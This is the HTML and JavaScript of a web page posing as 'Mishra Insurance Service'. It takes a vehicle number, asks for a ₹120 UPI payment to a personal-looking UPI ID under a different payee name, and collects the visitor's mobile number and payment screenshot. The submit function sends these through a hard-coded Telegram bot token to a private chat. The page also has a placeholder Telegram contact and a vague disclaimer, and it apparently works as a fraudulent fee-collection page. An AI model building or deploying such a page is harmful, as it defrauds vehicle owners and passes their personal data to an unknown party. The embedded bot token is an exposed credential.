<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mishra Insurance Service</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial;}

body{
background:#f4f6f9;
min-height:100vh;
}

/* TOP BAR */
.topbar{
position:fixed;
top:0;
left:0;
width:100%;
height:60px;
background:#ffffff;
display:flex;
align-items:center;
justify-content:space-between;
padding:0 20px;
box-shadow:0 4px 15px rgba(0,0,0,0.08);
z-index:1000;
}

.logo{
font-weight:600;
color:#003366;
}

.menu-icon{
width:30px;
cursor:pointer;
}

.menu-icon div{
height:3px;
background:#003366;
margin:5px 0;
border-radius:3px;
}

/* SIDE MENU */
.sideMenu{
position:fixed;
top:0;
right:-260px;
width:250px;
height:100%;
background:#ffffff;
box-shadow:-5px 0 20px rgba(0,0,0,0.1);
padding-top:80px;
transition:0.4s;
z-index:999;
}

.sideMenu button{
width:90%;
margin:10px 5%;
padding:12px;
border:none;
border-radius:10px;
background:#003366;
color:#fff;
cursor:pointer;
font-weight:500;
transition:0.3s;
}

.sideMenu button:hover{
background:#001f4d;
}

.openMenu{
right:0;
}

/* CARD */
.card{
margin-top:120px;
width:92%;
max-width:420px;
margin-left:auto;
margin-right:auto;
background:#fff;
padding:30px;
border-radius:18px;
box-shadow:0 10px 30px rgba(0,0,0,0.08);
text-align:center;
}

input{
width:100%;
padding:14px;
margin-top:14px;
border-radius:10px;
border:1px solid #ddd;
font-size:15px;
}

/* Neon RGB Button */
.neonBtn{
width:100%;
padding:14px;
margin-top:14px;
border:none;
border-radius:10px;
font-weight:600;
cursor:pointer;
background:#000;
color:#fff;
box-shadow:0 0 10px #00f2fe,0 0 20px #43e97b;
animation:rgbGlow 2s infinite alternate;
}

@keyframes rgbGlow{
0%{box-shadow:0 0 10px #00f2fe;}
50%{box-shadow:0 0 20px #ff00ff;}
100%{box-shadow:0 0 20px #43e97b;}
}

.neonBtn:active{
transform:scale(0.96);
}

/* Loader */
.loader{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(255,255,255,0.9);
display:none;
align-items:center;
justify-content:center;
font-size:18px;
font-weight:600;
color:#003366;
z-index:2000;
}

.hidden{display:none;}

.section{
padding:25px;
}

.qr{
width:180px;
margin-top:15px;
}

</style>
</head>
<body>

<div class="topbar">
<div class="logo">Mishra Insurance</div>
<div class="menu-icon" onclick="toggleMenu()">
<div></div>
<div></div>
<div></div>
</div>
</div>

<div class="sideMenu" id="menu">
<button onclick="openInsurance()">Insurance</button>
<button onclick="openAbout()">About</button>
<button onclick="openContact()">Contact</button>
<button onclick="openDisclaimer()">Disclaimer</button>
</div>

<div class="loader" id="loader">Loading...</div>

<div class="card">

<div id="homePage">
<h3>Enter Vehicle Number</h3>
<input id="vehicle" placeholder="BR-09-AB-1234">
<button class="neonBtn" onclick="goPay()">Continue</button>
</div>

<div id="payPage" class="hidden">
<h3>Service Fee â‚¹120</h3>

<button class="neonBtn"
onclick="showLoader(); window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
Pay with UPI
</button>

<img class="qr"
src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR">

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">

<button class="neonBtn" onclick="submitForm()">Submit</button>
<button class="neonBtn" onclick="goHome()">Back</button>
</div>

<div id="aboutPage" class="hidden section">
<h3>About</h3>
<p>We provide vehicle assistance and insurance services.</p>
</div>

<div id="contactPage" class="hidden section">
<h3>Contact</h3>
<button class="neonBtn"
onclick="window.location.href='https://t.me/yourtelegramusername'">
Chat on Telegram
</button>
</div>

<div id="disclaimerPage" class="hidden section">
<h3>Disclaimer</h3>
<p>This is a private assistance platform. Not affiliated with any government authority.</p>
</div>

</div>

<script>

const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

function showLoader(){
document.getElementById("loader").style.display="flex";
setTimeout(()=>{document.getElementById("loader").style.display="none";},700);
}

function toggleMenu(){
document.getElementById("menu").classList.toggle("openMenu");
}

function goHome(){
showLoader();
homePage.classList.remove("hidden");
payPage.classList.add("hidden");
aboutPage.classList.add("hidden");
contactPage.classList.add("hidden");
disclaimerPage.classList.add("hidden");
}

function openInsurance(){goHome();}
function openAbout(){showLoader();homePage.classList.add("hidden");aboutPage.classList.remove("hidden");}
function openContact(){showLoader();homePage.classList.add("hidden");contactPage.classList.remove("hidden");}
function openDisclaimer(){showLoader();homePage.classList.add("hidden");disclaimerPage.classList.remove("hidden");}

function goPay(){
if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
showLoader();
homePage.classList.add("hidden");
payPage.classList.remove("hidden");
}

function submitForm(){
if(mobile.value.length<10){alert("Enter valid mobile");return;}
if(!proof.files[0]){alert("Upload screenshot");return;}

showLoader();

let data=new FormData();
data.append("chat_id",chatId);
data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
data.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{
method:"POST",
body:data
})
.then(()=>{
alert("Submitted Successfully");
goHome();
})
.catch(()=>{
alert("Submission Failed");
});
}

</script>

</body>
</html>
